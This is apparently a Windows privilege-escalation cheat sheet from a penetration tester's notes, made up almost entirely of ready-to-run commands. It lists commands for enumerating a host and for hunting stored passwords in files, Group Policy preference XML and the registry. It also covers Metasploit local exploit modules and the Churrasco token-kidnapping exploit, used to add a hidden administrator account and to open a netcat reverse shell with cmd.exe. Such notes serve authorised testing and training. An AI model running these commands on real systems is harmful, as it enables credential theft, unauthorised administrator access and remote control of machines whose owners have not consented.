#### Information Gathering
- systeminfo ***OS info***
- hostname ***host info***
- net users ***users info***
- net user <user_name>
- ipconfig /all ***network interfaces and routing table.***
- route print
- arp -A
- netstat -ano ***network connections and the firewall rules***
- netsh firewall show state
- netsh firewall show state
- netsh firewall show config
- schtasks /query /fo LIST /v ***scheduled tasks, running processes, started services and installed drivers.***
- tasklist /SVC
- net start
----------------------------------------------------------------------------------------------------------------------------------
#### Stored Credentials
***Find passwords in Windows File***
- findstr /si password *.txt
- findstr /si password *.xml
- findstr /si password *.ini
- findstr /spin "password" *.*
- C:\> dir /s *pass* == *cred* == *vnc* == *.config*
- C:\> dir /b /s unattend.xml
- C:\> dir /b /s web.config
- C:\> dir /b /s sysprep.inf
- C:\> dir /b /s sysprep.xml
- C:\> dir /b /s *pass*
- C:\> dir /b /s vnc.ini

***password stored in windows files***
- C:\sysprep.inf
- C:\sysprep\sysprep.xml
- C:\unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
- C:\inetpub\wwwroot\web.config
- dir c:\*vnc.ini /s /b
- dir c:\*ultravnc.ini /s /b 
- dir c:\ /s /b | findstr /si *vnc.ini
- *Group Policy Preferences* The Groups.xml file contains the password is cached locally.
```
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```
- Other policy preference files
```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```
***In Registry***
- ***Putty*** : reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
- ***SNMP Paramters*** : reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
- ***Windows autologin*** : reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- ***VNC*** : reg query "HKCU\Software\ORL\WinVNC3\Password"
- ***Search for password in registry*** : reg query HKLM /f password /t REG_SZ /s ***OR*** reg query HKCU /f password /t REG_SZ /s

#### Service available form inside
- netstat -ano

#### With meterpreter
- use post/multi/recon/local_exploit_suggester
- set session ?
- run

- example: use exploit/windows/local/ms10_015_kitrap0d
- options
- run

#### Use Local Privilages Escalation via Token Kidnapping
- churrasco.bin "net user user_login user_password /add && net localgroup Administrators user_login /add"

###### Add user to Remote Desktop Users
- churrasco "NET LOCALGROUP "Remote Desktop Users" user_login /ADD"

###### Reverse shell via Admin and currasco  (need nc.exe)
churrasco.exe “nc.exe ip port -e cmd.exe”
- ***Churrasco*** https://www.exploit-db.com/exploits/6705

#### Usefull scrips

- ***Windows Exploit Suggester*** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- ***JustAnotherWindowsScript(Enum)*** https://github.com/411Hall/JAWS
- ***Impacket*** https://github.com/SecureAuthCorp/impacket
- ***Nishang*** https://github.com/samratashok/nishang
